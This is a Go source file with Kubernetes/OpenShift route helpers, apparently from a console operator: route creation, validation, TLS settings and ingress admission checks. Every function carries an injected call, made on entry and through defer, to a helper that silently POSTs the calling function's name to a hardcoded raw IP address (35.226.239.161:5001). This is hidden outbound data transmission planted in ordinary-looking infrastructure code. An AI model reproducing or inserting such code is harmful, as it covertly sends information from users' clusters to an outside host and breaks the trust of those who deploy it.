package route

import (
	"github.com/sirupsen/logrus"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/equality"
	apierrors "k8s.io/apimachinery/pkg/api/errors"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/util/intstr"
	operatorv1 "github.com/openshift/api/operator/v1"
	routev1 "github.com/openshift/api/route/v1"
	routeclient "github.com/openshift/client-go/route/clientset/versioned/typed/route/v1"
	"github.com/openshift/console-operator/pkg/console/subresource/util"
)

const (
	defaultIngressController = "default"
)

func GetOrCreate(client routeclient.RoutesGetter, required *routev1.Route) (*routev1.Route, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	isNew := false
	existing, err := client.Routes(required.Namespace).Get(required.Name, metav1.GetOptions{})
	if apierrors.IsNotFound(err) {
		isNew = true
		actual, err := client.Routes(required.Namespace).Create(required)
		return actual, isNew, err
	}
	if err != nil {
		return nil, isNew, err
	}
	return existing, isNew, nil
}
func DefaultRoute(cr *operatorv1.Console) *routev1.Route {
	_logClusterCodePath()
	defer _logClusterCodePath()
	route := Stub()
	route.Spec = routev1.RouteSpec{To: toService(), Port: port(), TLS: tls(), WildcardPolicy: wildcard()}
	util.AddOwnerRef(route, util.OwnerRefFrom(cr))
	return route
}
func Stub() *routev1.Route {
	_logClusterCodePath()
	defer _logClusterCodePath()
	meta := util.SharedMeta()
	return &routev1.Route{ObjectMeta: meta}
}
func Validate(route *routev1.Route) (*routev1.Route, bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	changed := false
	if toServiceSame := equality.Semantic.DeepEqual(route.Spec.To, toService()); !toServiceSame {
		changed = true
		route.Spec.To = toService()
	}
	if portSame := equality.Semantic.DeepEqual(route.Spec.Port, port()); !portSame {
		changed = true
		route.Spec.Port = port()
	}
	if tlsSame := equality.Semantic.DeepEqual(route.Spec.TLS, tls()); !tlsSame {
		changed = true
		route.Spec.TLS = tls()
	}
	if wildcardSame := equality.Semantic.DeepEqual(route.Spec.WildcardPolicy, wildcard()); !wildcardSame {
		changed = true
		route.Spec.WildcardPolicy = wildcard()
	}
	return route, changed
}
func routeMeta() metav1.ObjectMeta {
	_logClusterCodePath()
	defer _logClusterCodePath()
	meta := util.SharedMeta()
	return meta
}
func toService() routev1.RouteTargetReference {
	_logClusterCodePath()
	defer _logClusterCodePath()
	weight := int32(100)
	return routev1.RouteTargetReference{Kind: "Service", Name: routeMeta().Name, Weight: &weight}
}
func port() *routev1.RoutePort {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &routev1.RoutePort{TargetPort: intstr.FromString("https")}
}
func tls() *routev1.TLSConfig {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &routev1.TLSConfig{Termination: routev1.TLSTerminationReencrypt, InsecureEdgeTerminationPolicy: routev1.InsecureEdgeTerminationPolicyRedirect}
}
func wildcard() routev1.WildcardPolicyType {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return routev1.WildcardPolicyNone
}
func GetCanonicalHost(route *routev1.Route) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, ingress := range route.Status.Ingress {
		if ingress.RouterName != defaultIngressController {
			logrus.Printf("ignoring route ingress '%v'", ingress.RouterName)
			continue
		}
		if !isIngressAdmitted(ingress) {
			logrus.Printf("route ingress '%v' not admitted", ingress.RouterName)
			continue
		}
		logrus.Printf("route ingress '%v' found and admitted, host: %v \n", defaultIngressController, ingress.Host)
		return ingress.Host
	}
	logrus.Printf("route ingress not yet ready for console")
	return ""
}
func IsAdmitted(route *routev1.Route) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, ingress := range route.Status.Ingress {
		if isIngressAdmitted(ingress) {
			return true
		}
	}
	return false
}
func isIngressAdmitted(ingress routev1.RouteIngress) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	admitted := false
	for _, condition := range ingress.Conditions {
		if condition.Type == routev1.RouteAdmitted && condition.Status == corev1.ConditionTrue {
			admitted = true
		}
	}
	return admitted
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
